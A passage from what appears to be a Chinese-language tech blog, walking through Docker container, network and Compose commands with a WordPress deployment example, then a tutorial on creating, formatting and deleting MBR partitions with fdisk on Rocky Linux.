0.0.0.0:8080-&gt;80/tcp, :::8080-&gt;80/tcp   nginx1\n\n重启容器使用命令 docker restart &#123;容器ID|容器名称&#125; 来重启容器。\n进入容器使用命令 docker exec -it &#123;容器ID|容器名称&#125; /bin/sh 来进入容器，/bin/sh 是指定进入容器时用的终端，如果容器内有其他终端可以自行修改：\n[root@docker ~]# docker exec -it nginx1 /bin/sh# exit[root@docker ~]# docker exec -it nginx1 /bin/bashroot@4cf61416ee67:/# lsbin  boot  dev  docker-entrypoint.d  docker-entrypoint.sh  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  varroot@4cf61416ee67:/# exitexit\n\n容器删除使用命令 docker rm &#123;容器ID|容器名称&#125; 来删除已经关闭的容器，如果容器在运行中想要强制删除可以加 -f 参数进行强制删除：\n[root@docker ~]# docker psCONTAINER ID   IMAGE     COMMAND                  CREATED          STATUS         PORTS                                   NAMES4cf61416ee67   nginx     &quot;/docker-entrypoint.…&quot;   15 minutes ago   Up 7 minutes   0.0.0.0:8080-&gt;80/tcp, :::8080-&gt;80/tcp   nginx1[root@docker ~]# docker rm -f nginx1nginx1[root@docker ~]# docker psCONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES\n\n容器日志使用命令 docker logs &#123;容器ID|容器名称&#125; 来查看容器运行时的日志：\n[root@docker ~]# docker run -p 8081:80 -d --name myweb nginx497eff031c03927f17fe14fcff49bea832403687d580294c42f9cfba697a1564[root@docker ~]# docker logs myweb/docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration/docker-entrypoint.sh: Looking for shell scripts in /docker-entrypoint.d//docker-entrypoint.sh: Launching /docker-entrypoint.d/10-listen-on-ipv6-by-default.sh10-listen-on-ipv6-by-default.sh: info: Getting the checksum of /etc/nginx/conf.d/default.conf10-listen-on-ipv6-by-default.sh: info: Enabled listen on IPv6 in /etc/nginx/conf.d/default.conf/docker-entrypoint.sh: Launching /docker-entrypoint.d/20-envsubst-on-templates.sh/docker-entrypoint.sh: Launching /docker-entrypoint.d/30-tune-worker-processes.sh/docker-entrypoint.sh: Configuration complete; ready for start up2022/05/02 05:30:57 [notice] 1#1: using the &quot;epoll&quot; event method2022/05/02 05:30:57 [notice] 1#1: nginx/1.21.62022/05/02 05:30:57 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6)2022/05/02 05:30:57 [notice] 1#1: OS: Linux 4.18.0-348.el8.0.2.x86_642022/05/02 05:30:57 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:10485762022/05/02 05:30:57 [notice] 1#1: start worker processes2022/05/02 05:30:57 [notice] 1#1: start worker process 322022/05/02 05:30:57 [notice] 1#1: start worker process 33\n\n容器转镜像使用命令 docker commit &#123;容器ID|容器名称&#125; 镜像名称 来打包容器，如果容器在运行中可以使用 -p 参数：\n[root@docker ~]# docker commit -p myweb myweb:v1.0sha256:05f5efa5b56fd3d9c6d17b74ee4a3e9866095ac8cc681879dda21b9b7a968859[root@docker ~]# docker imagesREPOSITORY    TAG       IMAGE ID       CREATED         SIZEmyweb         v1.0      05f5efa5b56f   4 seconds ago   142MBnginx         latest    fa5269854a5e   11 days ago     142MBhello-world   latest    feb5d9fea6a5   7 months ago    13.3kB\n\n容器信息使用命令 docker inspect &#123;容器ID|容器名称&#125; 来查看容器的详细信息。这里举例筛选出容器的 IP：\n[root@docker ~]# docker inspect myweb|grep IP            &quot;LinkLocalIPv6Address&quot;: &quot;&quot;,            &quot;LinkLocalIPv6PrefixLen&quot;: 0,            &quot;SecondaryIPAddresses&quot;: null,            &quot;SecondaryIPv6Addresses&quot;: null,            &quot;GlobalIPv6Address&quot;: &quot;&quot;,            &quot;GlobalIPv6PrefixLen&quot;: 0,            &quot;IPAddress&quot;: &quot;172.17.0.2&quot;,            &quot;IPPrefixLen&quot;: 16,            &quot;IPv6Gateway&quot;: &quot;&quot;,                    &quot;IPAMConfig&quot;: null,                    &quot;IPAddress&quot;: &quot;172.17.0.2&quot;,                    &quot;IPPrefixLen&quot;: 16,                    &quot;IPv6Gateway&quot;: &quot;&quot;,                    &quot;GlobalIPv6Address&quot;: &quot;&quot;,                    &quot;GlobalIPv6PrefixLen&quot;: 0,\n\nDockerfile概述Dockerfile 是一个用来构建镜像的文本文件，文本内容包含了一条条构建镜像所需的指令和说明。\n构建参数COPY复制指令，从上下文目录中复制到容器里面。\n用法：\nCOPY [--chown=用户:组] 源路径 容器目的路径\n\n--chown 可以不使用。\nADDADD 和 COPY 使用格式类似，同样需求下官方推荐使用 COPY。\nRUN运行命令。\n用法：\nRUN 命令\n\nCMD类似于 RUN，与 RUN 不同的是 CMD 是在 docker run 的时候执行，而 RUN 是在 Dockerfile 构建镜像的时候执行。\n用法和 RUN 一样。\nENTRYPOINT类似于 CMD 参数，但其不会被 docker run 的命令参数覆盖（当 Dockerfile 存在多个此参数的时候只会执行最后一个）。\n用法和 RUN、CMD 一样。\nENV改变环境变量，定义环境变量。\nENV key value\n\nARG和 ENV 效果一样，但只会在 Dockerfile 构建的时候生效，构建好容器之后不生效。\nVOLUME定义默认挂载数据卷，当运行容器的时候如果没有定义位置会自动挂载。\nVOLUME 路径 路径\n\nEXPOSE声明端口，当使用 -P 运行容器的时候就是映射的这个端口。\nEXPOSE 端口\n\nWORKDIR指定工作目录，就是链接时的默认目录。\nWORKDIR 目录\n\nUSER用来指定执行后续命令的用户。\nUSER 用户\n\n构建写好 Dockerfile 文件之后使用命令 docker build 镜像名称:版本 dockerfile的目录 来构建：\n[root@docker ~]# mkdir dockerfile[root@docker ~]# cd dockerfile/[root@docker dockerfile]# vim dockerfile[root@docker dockerfile]# cat dockerfileFROM nginxRUN echo &#x27;我是dockerfile构建的容器&#x27; &gt; /usr/share/nginx/html/index.html[root@docker dockerfile]# docker build -t mynginx:v1.0 ./Sending build context to Docker daemon  2.048kBStep 1/2 : FROM nginx ---&gt; fa5269854a5eStep 2/2 : RUN echo &#x27;我是dockerfile构建的容器&#x27; &gt; /usr/share/nginx/html/index.html ---&gt; Running in d73c0f94b402Removing intermediate container d73c0f94b402 ---&gt; 4650cd039883Successfully built 4650cd039883Successfully tagged mynginx:v1.0[root@docker dockerfile]# docker images |grep mynginxmynginx       v1.0      4650cd039883   10 seconds ago   142MB\n\nDocker 的网络概述Docker 网络是宿主机虚拟出来的，并不是真实存在的网络设备，外部网络无法直接访问到容器，从而实现网络的隔离。\n网络模式Host\n启动容器时使用 Host 模式，那这个容器将不会获得一个独立的 IP，而是和宿主机共用一个 IP，容器将不会虚拟出自己的网卡，而是使用宿主机的 IP 和端口，但是容器其他方面，比如文件系统，进程系统都是独立的。\nContainer\n启动容器时使用 Container 模式，需要指定一个容器 ID 或者容器名称，这个模式会和指定的容器共享同一个 IP，和 Host 模式一样，除了 IP 是共享对应容器的 IP 之外，容器的其他方面，比如文件系统，进程系统都是独立的。\nNone\n启动容器时使用 None 模式，Docker 容器将不会生成网卡，也就是说容器会没有网卡、IP、路由等信息。需要我们自己来添加。这种网络情况只会又一个 lo 回环网卡。\nBridge\n当 Docker 服务启动的时候，会在主机上创建一个 docker0 的虚拟网卡，此主机默认启动的容器都会链接到这个虚拟网卡上。类似于 VMware 的一个虚拟网络。\n网络管理网络列表使用命令 docker network ls 来列出所有当前网络：\n[root@docker ~]# docker network lsNETWORK ID     NAME      DRIVER    SCOPEac3a791d7c38   bridge    bridge    localcb275e88b131   host      host      local68b3fda03c16   none      null      local\n\n创建网络docker network create 参数 网络名称\n\n\n-d: 网络模式\n--subnet: 指定网段\n--gateway: 指定网关（指定虚拟网卡的 IP）\n\n自定义网络可以支持很多功能，比如不需要 DNS 可以通过容器名来互相 ping。例如，我用 network create 创建了一个网络，并且创建了两个容器 os1、os2，使用 os1 ping os2 的时候会互通，不需要配置任何 DNS，它会自动寻找，而默认的 docker0 则没有这个功能。\n[root@docker ~]# docker network create -d bridge --subnet 192.168.1.0/24 --gateway 192.168.1.254 mynetwork5fb087dccbabedf4b97fcc09b448ee717acbfa35fc520698985f536dea8be5e7[root@docker ~]# docker network lsNETWORK ID     NAME        DRIVER    SCOPEac3a791d7c38   bridge      bridge    localcb275e88b131   host        host      local5fb087dccbab   mynetwork   bridge    local68b3fda03c16   none        null      local\n\n删除网络使用命令 docker network rm &#123;网络ID|网络名称&#125;：\n[root@docker ~]# docker network lsNETWORK ID     NAME        DRIVER    SCOPEac3a791d7c38   bridge      bridge    localcb275e88b131   host        host      local5fb087dccbab   mynetwork   bridge    local68b3fda03c16   none        null      local[root@docker ~]# docker network rm mynetworkmynetwork[root@docker ~]# docker network lsNETWORK ID     NAME      DRIVER    SCOPEac3a791d7c38   bridge    bridge    localcb275e88b131   host      host      local68b3fda03c16   none      null      local\n\n关联容器docker network connect 命令是用于将 Docker 容器连接&#x2F;断开到某个网络中，或者与其他容器建联&#x2F;断开，容器可以使用容器名或者容器 ID。\n用法：\ndocker network connect/disconnect &#123;网络ID|网络名称&#125; &#123;容器ID|容器名称&#125;\n\n详细信息使用命令 docker network inspect &#123;网络ID|网络名称&#125; 来查询网络的详细信息：\n[root@docker ~]# docker network create -d bridge --subnet 192.168.1.0/24 --gateway 192.168.1.254 mynetworkaf5233ce4e299130cadee1bc8c9754b576bfb63d6ac229ad7856a653b2109e1e[root@docker ~]# docker network inspect mynetwork[    &#123;        &quot;Name&quot;: &quot;mynetwork&quot;,        &quot;Id&quot;: &quot;af5233ce4e299130cadee1bc8c9754b576bfb63d6ac229ad7856a653b2109e1e&quot;,        &quot;Created&quot;: &quot;2022-05-02T02:44:46.644429172-04:00&quot;,        &quot;Scope&quot;: &quot;local&quot;,        &quot;Driver&quot;: &quot;bridge&quot;,        &quot;EnableIPv6&quot;: false,        &quot;IPAM&quot;: &#123;            &quot;Driver&quot;: &quot;default&quot;,            &quot;Options&quot;: &#123;&#125;,            &quot;Config&quot;: [                &#123;                    &quot;Subnet&quot;: &quot;192.168.1.0/24&quot;,                    &quot;Gateway&quot;: &quot;192.168.1.254&quot;                &#125;            ]        &#125;,        &quot;Internal&quot;: false,        &quot;Attachable&quot;: false,        &quot;Ingress&quot;: false,        &quot;ConfigFrom&quot;: &#123;            &quot;Network&quot;: &quot;&quot;        &#125;,        &quot;ConfigOnly&quot;: false,        &quot;Containers&quot;: &#123;&#125;,        &quot;Options&quot;: &#123;&#125;,        &quot;Labels&quot;: &#123;&#125;    &#125;]\n\nDocker-Compose 容器编排概述Docker Compose 可以轻松、高效地管理容器，它是一个用于定义和运行多个容器的 Docker 应用程序工具。在生产环境中，一个应用通常由多个 Docker 容器构成，而单纯的 Docker 一次性只能实现单个容器的部署，为了解决这个问题，Docker Compose 应运而生。\n安装官方下载文档: https://docs.docker.com/compose/install/\nDocker 默认不自带 Docker Compose 工具，需要手动下载：\n[root@docker ~]# curl -SL https://github.com/docker/compose/releases/download/v2.4.1/docker-compose-linux-x86_64 -o /usr/bin/docker-compose  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100   664  100   664    0     0   1412      0 --:--:-- --:--:-- --:--:--  1412100 25.2M  100 25.2M    0     0   239k      0  0:01:48  0:01:48 --:--:--  365k[root@docker ~]# chmod +x /usr/bin/docker-compose[root@docker ~]# docker-compose -vDocker Compose version v2.4.1\n\n使用和管理使用使用 Docker Compose 需要在目录里定义一个名称为 docker-compose.yml 的 YML 文件，这个文件用来定义服务配置，之后可以使用 Docker Compose 来管理这个文件里定义的资源。\n官方文档: Docker-Compose\n启动docker-compose up\n\n在当前目录定义好 docker-compose.yml 文件之后可以使用此命令来运行，默认在前台运行，可以追加 -d 参数使其运行在后台。\n重新运行docker-compose restart\n\n重启全部定义的容器资源。\n停止运行docker-compose stop\n\n停止运行定义的容器。\n删除docker-compose down\n\n停止并删除对应的容器。\nYML 配置参考docker-compose.yml 的格式# 全局配置层version: &quot;3&quot;      # 版本services:  ## 定义层  app1:    ## 配置层    image: nginx:1.26    # 镜像    ports: 80:80         # 端口映射    environment: aa=bb   # 系统环境    volumes:             # 挂载卷定义    networks:            # 网络定义  app2:  app3:  ...\n\nversion这个版本需要和 Docker 的版本相对应，具体对应信息可去官网查看：版本对照\nbuild在配置层定义，如果自己定义了 Dockerfile 想让 Docker Compose 来运行，可以直接使用 build 来构建：\nversion: &quot;3&quot;services:  myapp:    build: .\n\nimage在配置层定义，用来指定镜像：\nversion: &quot;3&quot;services:  myapp:    image: nginx\n\ncommand在配置层定义，修改容器启动时执行的命令：\nversion: &quot;3&quot;services:  myapp:    image: centos    command: [&quot;bash&quot;]\n\ncontainer_name在配置层定义，默认 Docker Compose 启动容器的名称格式为 &lt;项目名称&gt;_&lt;服务名称&gt;_&lt;序号&gt;，这个参数可以直接修改容器的名字：\nversion: &quot;3&quot;services:  myapp:    container_name: myapp    image: centos    command: [&quot;bash&quot;]\n\nenvironment在配置层定义，定义容器的环境变量：\nversion: &quot;3&quot;services:  myapp:    container_name: mySQL    image: mariadb    environment:      MYSQL_ROOT_PASSWORD: aaaaaa\n\nenv_file在配置层定义，和 environment 一样用来定义环境变量，它指定一个文件，直接使用 environment 来定义环境变量可能会有一些敏感信息不适合直接放在 docker-compose.yml 里，env_file 可以指定一个环境文件，文件格式为键值对的方式 key=value：\nversion: &quot;3&quot;services:  myapp:    container_name: mySQL    image: mariadb    env_file:      - ./env\n\n[root@boychai docker-compose]# cat envMYSQL_ROOT_PASSWORD=aaaaaaa\n\ndepends_on在配置层定义，用来配置启动关系，配置了之后里面写其他服务容器的名称，只有里面定义的容器启动后，自己才会启动，可以理解为服务容器启动的前提条件：\nversion: &quot;3&quot;services:  web:    build: .    depends_on:      - db      - redis  redis:    image: redis  db:    image: mysql\n\nrestart在配置层定义，用来配置重启策略，模式如下：\n\nno: 默认的重启策略，在任何情况下都不会重启容器\nalways: 容器总是重新启动\non-failure: 在容器非正常退出时（退出状态非 0），才会重启容器\nunless-stopped: 在容器退出时总是重启容器，但不考虑在 Docker 守护进程启动时就已经停止了的容器\n\nversion: &quot;3&quot;services:  web:    restart: always    build: .    depends_on:      - db      - redis  redis:    restart: always    image: redis  db:    restart: always    image: mysql\n\nvolumes在配置层定义，用来把主机的数据卷或文件挂载到容器里：\nversion: &quot;3&quot;services:  myapp:    image: nginx:latest    volumes:      - &quot;/usr/nginx/html:/usr/share/nginx/html&quot;      - &quot;/var/log/nginx:/var/log/nginx&quot;\n\n也可以在全局层进行声明，然后配置层进行调用：\nversion: &quot;3&quot;services:  myapp:    image: nginx:latest    volumes:      - nginx_html:/usr/share/nginx/html      - nginx_log:/var/log/nginxvolumes:  nginx_html: /usr/nginx/html  nginx_log: /var/log/nginx\n\nnetworks网络配置，默认不声明的话 Docker 会自动生成一个默认的 Bridge 类型的网络，在全局配置层定义一个 networks：\nversion: &quot;3&quot;services:  myapp:    image: nginx:latestnetworks:  default:    driver: bridge\n\n定义默认网络模式为 Bridge，如果容器不指定则全部使用 Bridge。我们还可以自定义一个网络名字，之后在容器的配置层进行绑定这个名字：\nversion: &quot;3&quot;services:  myapp:    image: nginx:latest    networks:      - mynetworknetworks:  mynetwork:    driver: bridge\n\n也可以绑定已存在的网络：\nversion: &quot;3&quot;services:  myapp:    image: nginx:latest    networks:      - mynetworknetworks:  mynetwork:    external:      name: network-test\n\n其他关于 Docker Compose 的配置有很多，这里只是介绍了部分常用的配置，更多具体的配置可以去官网查看：更多配置\n实例这里使用 Docker Compose 的方式部署一个 WordPress 的博客，提供配置参考学习使用。\n官方教程\n[root@boychai wp]# cat &gt; docker-compose.yml &lt;&lt;EOFversion: &#x27;3.1&#x27;services:  wordpress:    image: wordpress    restart: always    ports:      - 8080:80    environment:      WORDPRESS_DB_HOST: db      WORDPRESS_DB_USER: exampleuser      WORDPRESS_DB_PASSWORD: examplepass      WORDPRESS_DB_NAME: exampledb    volumes:      - wordpress:/var/www/html  db:    image: mysql:5.7    restart: always    environment:      MYSQL_DATABASE: exampledb      MYSQL_USER: exampleuser      MYSQL_PASSWORD: examplepass      MYSQL_RANDOM_ROOT_PASSWORD: &#x27;1&#x27;    volumes:      - db:/var/lib/mysqlvolumes:  wordpress:  db:EOF[root@boychai wp]# docker-compose up -dCreating network &quot;wp_default&quot; with the default driverCreating volume &quot;wp_wordpress&quot; with default driverCreating volume &quot;wp_db&quot; with default driverPulling wordpress (wordpress:)...latest: Pulling from library/wordpressa2abf6c4d29d: Already existsc5608244554d: Already exists2d07066487a0: Already exists1b6dfaf1958c: Already exists32c5e6a60073: Already exists90cf855b27cc: Already exists8b0f1068c586: Already exists5355461305e8: Already existsad1eec592342: Already existse03fbc76cb78: Already exists1f5796e48b39: Already exists72fbe8e1d4e7: Already exists96edece66175: Already exists5f46f0743de2: Pull completec9f9671a5e1f: Pull complete3f543dcd35b1: Pull completec88e21a0c2a0: Pull complete964b4457a910: Pull complete0d55fb9a64ef: Pull completefb009ff7c567: Pull complete4f058a67a50d: Pull completeDigest: sha256:fc33b796b04162a0db2e9ea9b4c361a07058b21597b1317ad9ab3ea4593de241Status: Downloaded newer image for wordpress:latestCreating wp_db_1        ... doneCreating wp_wordpress_1 ... done[root@boychai wp]#\n\n访问服务器地址加 8080 端口即可出现博客初始化页面，如下图：\n\n","categories":["工具相关"],"tags":["开源工具","Docker"]},{"title":"Fdisk-MBR分区工具","url":"/2023/03/30/Fdisk-MBR%E5%88%86%E5%8C%BA%E5%B7%A5%E5%85%B7/","content":"概述fdisk是一种用于管理磁盘分区的工具，常用于Linux和其他Unix-like操作系统中。它可以用于创建、删除和修改磁盘分区，并支持多种文件系统类型，例如FAT、ext2、ext3等。\nfdisk还可以显示当前系统中所有磁盘的分区信息，包括磁盘标识符、分区类型、分区大小等。使用fdisk，用户可以轻松地管理磁盘空间，为不同的操作系统或应用程序分配不同的存储空间。\n除此之外，fdisk还支持MBR(Master Boot Record)分区方案，它是一种常见的磁盘分区方案，能够在BIOS引导下启动操作系统。\nMBRMBR（Master Boot Record）分区是指使用MBR分区方案的磁盘分区方式。MBR分区方案是一种常见的分区方案，能够在BIOS引导下启动操作系统。MBR分区方案将磁盘的前512个字节（即MBR）用于存储分区表和引导程序。其中分区表记录了磁盘分区的信息，包括分区类型、分区起始位置、分区大小等。MBR分区方案最多支持4个主分区或3个主分区和1个扩展分区，扩展分区可以划分为多个逻辑分区。MBR分区方案已经存在了很长时间，但是它有一个缺点，即它只支持最大2TB的磁盘容量。如果需要使用更大的磁盘，就需要使用GPT（GUID Partition Table）分区方案。\n环境系统：Rocky Linux release 8.5\n工具：fdisk from util-linux 2.32.1\n硬盘：虚拟机添加了一块20G的硬盘\n\n实践主分区[root@host ~]# lsblk -p                           // 通过lsblk来查看一下新增的硬盘位置(/dev/sdb)NAME                    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT/dev/sda                  8:0    0   20G  0 disk ├─/dev/sda1               8:1    0    1G  0 part /boot└─/dev/sda2               8:2    0   19G  0 part   ├─/dev/mapper/rl-root 253:0    0   17G  0 lvm  /  └─/dev/mapper/rl-swap 253:1    0    2G  0 lvm  [SWAP]/dev/sdb                  8:16   0   20G  0 disk /dev/sr0                 11:0    1 1024M  0 rom[root@host ~]# fdisk /dev/sdb                    // 使用fdisk工具对/dev/sdb这块硬盘进行分区Welcome to fdisk (util-linux 2.32.1).Changes will remain in memory only, until you decide to write them.Be careful before using the write command.Device does not contain a recognized partition table.Created a new DOS disklabel with disk identifier 0x178d8de5.Command (m for help): n                         // 输入n进行新建分区操作Partition type   p   primary (0 primary, 0 extended, 4 free)   e   extended (container for logical partitions)Select (default p): p                            // p是创建主分区，e是创建逻辑分区Partition number (1-4, default 1): 1             // 选择分区号,默认为1,这里可以改其他的(MBR分区最多有4个分区)First sector (2048-41943039, default 2048):      // 起始扇区选择默认即可Last sector, +sectors or +size&#123;K,M,G,T,P&#125; (2048-41943039, default 41943039): +5G    //设置分区大小我这里设置5GCreated a new partition 1 of type &#x27;Linux&#x27; and of size 5 GiB.    //提示创建成功Command (m for help): p                     // p查看分区表Disk /dev/sdb: 20 GiB, 21474836480 bytes, 41943040 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisklabel type: dosDisk identifier: 0x178d8de5Device     Boot Start      End  Sectors Size Id Type/dev/sdb1        2048 10487807 10485760   5G 83 Linux                // 创建好的分区Command (m for help): w                                        // 保存之前的分区操作The partition table has been altered.Calling ioctl() to re-read partition table.Syncing disks.[root@host ~]# mkfs.xfs /dev/sdb1                          // 格式化创建好的分区meta-data=/dev/sdb1              isize=512    agcount=4, agsize=327680 blks         =                       sectsz=512   attr=2, projid32bit=1         =                       crc=1        finobt=1, sparse=1, rmapbt=0         =                       reflink=1data     =                       bsize=4096   blocks=1310720, imaxpct=25         =                       sunit=0      swidth=0 blksnaming   =version 2              bsize=4096   ascii-ci=0, ftype=1log      =internal log           bsize=4096   blocks=2560, version=2         =                       sectsz=512   sunit=0 blks, lazy-count=1realtime =none                   extsz=4096   blocks=0, rtextents=0[root@host ~]# mkdir /sdb1                           // 创建挂载位置[root@host ~]# mount /dev/sdb1 /sdb1                  // 将格式化好的分区进行挂载[root@host ~]# lsblk -p                                // 查看分区情况NAME                    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT/dev/sda                  8:0    0   20G  0 disk ├─/dev/sda1               8:1    0    1G  0 part /boot└─/dev/sda2               8:2    0   19G  0 part   ├─/dev/mapper/rl-root 253:0    0   17G  0 lvm  /  └─/dev/mapper/rl-swap 253:1    0    2G  0 lvm  [SWAP]/dev/sdb                  8:16   0   20G  0 disk └─/dev/sdb1               8:17   0    5G  0 part /sdb1          // 已经挂载好可以使用了/dev/sr0                 11:0    1 1024M  0 rom\n\n逻辑分区[root@host ~]# fdisk /dev/sdb                            // 对/dev/sdb进行分区Welcome to fdisk (util-linux 2.32.1).Changes will remain in memory only, until you decide to write them.Be careful before using the write command.Command (m for help): n                            // 创建分区Partition type   p   primary (1 primary, 0 extended, 3 free)   e   extended (container for logical partitions)Select (default p): e                           // 创建逻辑分区Partition number (2-4, default 2):              // 分区号First sector (10487808-41943039, default 10487808):       // 设置起始扇区选择默认即可Last sector, +sectors or +size&#123;K,M,G,T,P&#125; (10487808-41943039, default 41943039):       // 设置大小，逻辑分区的默认大小是剩余全部存储空间,这里我选择默认。 Created a new partition 2 of type &#x27;Extended&#x27; and of size 15 GiB.  Command (m for help): p                                 // 查看分区表Disk /dev/sdb: 20 GiB, 21474836480 bytes, 41943040 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisklabel type: dosDisk identifier: 0x178d8de5Device     Boot    Start      End  Sectors Size Id Type/dev/sdb1           2048 10487807 10485760   5G 83 Linux/dev/sdb2       10487808 41943039 31455232  15G  5 Extended               // 创建好了一个逻辑分区大小为15GCommand (m for help): w                      // 保存分区操作The partition table has been altered.Syncing disks.[root@host ~]# lsblk -pNAME                    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT/dev/sda                  8:0    0   20G  0 disk ├─/dev/sda1               8:1    0    1G  0 part /boot└─/dev/sda2               8:2    0   19G  0 part   ├─/dev/mapper/rl-root 253:0    0   17G  0 lvm  /  └─/dev/mapper/rl-swap 253:1    0    2G  0 lvm  [SWAP]/dev/sdb                  8:16   0   20G  0 disk ├─/dev/sdb1               8:17   0    5G  0 part /sdb1└─/dev/sdb2               8:18   0   15G  0 part /dev/sr0                 11:0    1 1024M  0 rom\n\n逻辑子分区创建好逻辑分区之后就可以在逻辑分区里面创建无数个子分区，这样就逃离了MBR分区方式的分区限制。\n[root@host ~]# fdisk /dev/sdb    // 对/dev/sdb进行分区Welcome to fdisk (util-linux 2.32.1).Changes will remain in memory only, until you decide to write them.Be careful before using the write command.Command (m for help): n         // 新建分区All space for primary partitions is in use.Adding logical partition 5      // 当创建好逻辑分区之后就会发现分区号会从5开始增加First sector (10489856-41943039, default 10489856):             // 磁盘起始位置，默认即可Last sector, +sectors or +size&#123;K,M,G,T,P&#125; (10489856-41943039, default 41943039): +1G     //设置大小Created a new partition 5 of type &#x27;Linux&#x27; and of size 1 GiB.Command (m for help): n                 // 继续创建All space for primary partitions is in use.Adding logical partition 6  First sector (12589056-41943039, default 12589056): Last sector, +sectors or +size&#123;K,M,G,T,P&#125; (12589056-41943039, default 41943039): +1GCreated a new partition 6 of type &#x27;Linux&#x27; and of size 1 GiB.Command (m for help): n            // 继续创建All space for primary partitions is in use.Adding logical partition 7First sector (14688256-41943039, default 14688256): Last sector, +sectors or +size&#123;K,M,G,T,P&#125; (14688256-41943039, default 41943039): +1GCreated a new partition 7 of type &#x27;Linux&#x27; and of size 1 GiB.Command (m for help): w              // 保存The partition table has been altered.Calling ioctl() to re-read partition table.Syncing disks.[root@host ~]# lsblk -p                  // 查看分区表NAME                    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT/dev/sda                  8:0    0   20G  0 disk ├─/dev/sda1               8:1    0    1G  0 part /boot└─/dev/sda2               8:2    0   19G  0 part   ├─/dev/mapper/rl-root 253:0    0   17G  0 lvm  /  └─/dev/mapper/rl-swap 253:1    0    2G  0 lvm  [SWAP]/dev/sdb                  8:16   0   20G  0 disk ├─/dev/sdb1               8:17   0    5G  0 part /sdb1├─/dev/sdb2               8:18   0    1K  0 part ├─/dev/sdb5               8:21   0    1G  0 part ├─/dev/sdb6               8:22   0    1G  0 part └─/dev/sdb7               8:23   0    1G  0 part /dev/sr0                 11:0    1 1024M  0 rom\n\n这里会发现sdb磁盘一共创建了7个分区。\n删除分区以sdb1为例，sdb1这个分区已经挂载到了&#x2F;sdb1目录已经在使用了，在删除分区前需要取消挂载。具体操作方法如下\n[root@host ~]# lsblk -p                                      // 查看分区状态   NAME                    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT/dev/sda                  8:0    0   20G  0 disk ├─/dev/sda1               8:1    0    1G  0 part /boot└─/dev/sda2               8:2    0   19G  0 part   ├─/dev/mapper/rl-root 253:0    0   17G  0 lvm  /  └─/dev/mapper/rl-swap 253:1    0    2G  0 lvm  [SWAP]/dev/sdb                  8:16   0   20G  0 disk ├─/dev/sdb1               8:17   0    5G  0 part /sdb1         // 发现/dev/sdb1已经挂载到/sdb1目录下├─/dev/sdb2               8:18   0    1K  0 part ├─/dev/sdb5               8:21   0    1G  0 part ├─/dev/sdb6               8:22   0    1G  0 part └─/dev/sdb7               8:23   0    1G  0 part /dev/sr0                 11:0    1 1024M  0 rom  [root@host ~]# umount /sdb1                                 // 取消挂载[root@host ~]# lsblk -p                                              NAME                    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT/dev/sda                  8:0    0   20G  0 disk ├─/dev/sda1               8:1    0    1G  0 part /boot└─/dev/sda2               8:2    0   19G  0 part   ├─/dev/mapper/rl-root 253:0    0   17G  0 lvm  /  └─/dev/mapper/rl-swap 253:1    0    2G  0 lvm  [SWAP]/dev/sdb                  8:16   0   20G  0 disk ├─/dev/sdb1               8:17   0    5G  0 part            // 已经取消挂载了├─/dev/sdb2               8:18   0    1K  0 part ├─/dev/sdb5               8:21   0    1G  0 part ├─/dev/sdb6               8:22   0    1G  0 part └─/dev/sdb7               8:23   0    1G  0 part /dev/sr0                 11:0    1 1024M  0 rom  [root@host ~]# fdisk /dev/sdbWelcome to fdisk (util-linux 2.32.1).Changes will remain in memory only, until you decide to write them.Be careful before using the write command.Command (m for help): d                                // d(delete)删除分区Partition number (1,2,5-7, default 7): 1               // 删除分区号，这里选择1Partition 1 has been deleted.Command (m for help): w                                // 保存位置The partition table has been altered.Calling ioctl() to re-read partition table.Syncing disks.[root@host ~]# lsblk -p                          // 查看磁盘状态NAME                    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT/dev/sda                  8:0    0   20G  0 disk ├─/dev/sda1               8:1    0    1G  0 part /boot└─/dev/sda2               8:2    0   19G  0 part   ├─/dev/mapper/rl-root 253:0    0   17G  0 lvm  /  └─/dev/mapper/rl-swap 253:1    0    2G  0 lvm  [SWAP]/dev/sdb                  8:16   0   20G  0 disk      // 发现sdb1已经消失         ├─/dev/sdb2               8:18   0    1K  0 part ├─/dev/sdb5               8:21   0    1G  0 part ├─/dev/sdb6               8:22   0    1G  0 part └─/dev/sdb7               8:23   0    1G  0 part /dev/sr0                 11:0    1 1024M  0 rom\n\n使用分区格式化分区创建好分区之后需要格式化之后才可以挂载使用，格式化需要使用mkfs工具，这里不多讲。关于格式化的格式可以使用mkfs.来查看\n[root@host ~]# mkfs.mkfs.cramfs  mkfs.ext2    mkfs.ext3    mkfs.ext4    mkfs.minix   mkfs.xfs\n\n这里使用xfs来格式化创建的分区(逻辑分区只能格式化子分区不能直接格式化逻辑分区)。\n[root@host ~]# lsblk -p                          // 查看分区状态NAME                    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT/dev/sda                  8:0    0   20G  0 disk ├─/dev/sda1               8:1    0    1G  0 part /boot└─/dev/sda2               8:2    0   19G  0 part   ├─/dev/mapper/rl-root 253:0    0   17G  0 lvm  /  └─/dev/mapper/rl-swap 253:1    0    2G  0 lvm  [SWAP]/dev/sdb                  8:16   0   20G  0 disk ├─/dev/sdb2               8:18   0    1K  0 part ├─/dev/sdb5               8:21   0    1G  0 part ├─/dev/sdb6               8:22   0    1G  0 part └─/dev/sdb7               8:23   0    1G  0 part /dev/sr0                 11:0    1 1024M  0 rom  [root@host ~]# mkfs.xfs /dev/sdb5              // 使用xfs类型格式化sdb5meta-data=/dev/sdb5              isize=512    agcount=4, agsize=65536 blks         =                       sectsz=512   attr=2, projid32bit=1         =                       crc=1        